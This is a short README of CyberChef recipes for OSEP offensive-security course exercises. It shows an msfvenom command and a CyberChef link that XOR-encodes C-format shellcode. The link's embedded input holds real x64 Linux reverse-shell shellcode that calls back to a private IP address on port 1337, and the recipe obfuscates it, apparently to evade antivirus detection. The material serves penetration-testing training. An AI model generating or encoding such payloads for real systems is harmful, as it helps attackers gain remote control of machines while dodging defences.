# OSEP CyberChef Recipes
Some handy recipes for OSEP exercises to generate encoded shellcodes with

## C Based shellcode:
cmd: `msfvenom -p <payload> -f c`

### XOR Encoding:
Based on chapter 10.2.2 of OSEP
<https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'(unsigned%20char%20buf%5C%5C%5B%5C%5C%5D%20%3D%20?%5C%5Cn%7C%5B%22;%5C%5C%5C%5Cx%5C%5Cn%5D)'%7D,'',true,false,true,false)From_Hex('Auto')XOR(%7B'option':'UTF8','string':'m'%7D,'Standard',false)To_Hex('%5C%5Cx',15)Find_/_Replace(%7B'option':'Regex','string':'(%5E%7C$)'%7D,'%22',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5E%22'%7D,'unsigned%20char%20buf%5B%5D%20%3D%20%5C%5Cn%22',true,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,';',true,false,false,false)&input=dW5zaWduZWQgY2hhciBidWZbXSA9IAoiXHg2YVx4MzlceDU4XHgwZlx4MDVceDQ4XHg4NVx4YzBceDc0XHgwOFx4NDhceDMxXHhmZlx4NmFceDNjIgoiXHg1OFx4MGZceDA1XHg2YVx4MzlceDU4XHgwZlx4MDVceDQ4XHg4NVx4YzBceDc0XHgwOFx4NDhceDMxIgoiXHhmZlx4NmFceDNjXHg1OFx4MGZceDA1XHg0OFx4MzFceGZmXHg2YVx4MDlceDU4XHg5OVx4YjZceDEwIgoiXHg0OFx4ODlceGQ2XHg0ZFx4MzFceGM5XHg2YVx4MjJceDQxXHg1YVx4YjJceDA3XHgwZlx4MDVceDQ4IgoiXHg4NVx4YzBceDc4XHg1MVx4NmFceDBhXHg0MVx4NTlceDUwXHg2YVx4MjlceDU4XHg5OVx4NmFceDAyIgoiXHg1Zlx4NmFceDAxXHg1ZVx4MGZceDA1XHg0OFx4ODVceGMwXHg3OFx4M2JceDQ4XHg5N1x4NDhceGI5IgoiXHgwMlx4MDBceDA1XHgzOVx4YzBceGE4XHg3Nlx4MDNceDUxXHg0OFx4ODlceGU2XHg2YVx4MTBceDVhIgoiXHg2YVx4MmFceDU4XHgwZlx4MDVceDU5XHg0OFx4ODVceGMwXHg3OVx4MjVceDQ5XHhmZlx4YzlceDc0IgoiXHgxOFx4NTdceDZhXHgyM1x4NThceDZhXHgwMFx4NmFceDA1XHg0OFx4ODlceGU3XHg0OFx4MzFceGY2IgoiXHgwZlx4MDVceDU5XHg1OVx4NWZceDQ4XHg4NVx4YzBceDc5XHhjN1x4NmFceDNjXHg1OFx4NmFceDAxIgoiXHg1Zlx4MGZceDA1XHg1ZVx4NmFceDdlXHg1YVx4MGZceDA1XHg0OFx4ODVceGMwXHg3OFx4ZWRceGZmIgoiXHhlNiI7>
